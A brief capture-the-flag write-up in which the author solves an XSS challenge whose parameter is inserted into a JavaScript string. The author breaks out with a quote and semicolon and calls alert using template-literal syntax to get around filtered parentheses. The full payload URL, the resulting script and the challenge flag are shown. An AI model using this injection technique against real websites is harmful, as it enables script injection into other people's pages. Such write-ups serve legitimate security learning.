I spent quite some time on this, and I learned something new :)

The xss parameter was set to a variable 'a':

<script>
var a = "stuff";
</script>

The most useful characters was filtered, I had almost given up when I found a clue in an old write-up and managed to get an alert () :)

http://xss2.sect.ctf.rocks/?xss=stuff%22;%20alert`1`//

Which became:

<script>
var a = "stuff"; alert`1`//";
</script>

sect{c4t_g0t_ur_p4r3nth3s3s?}
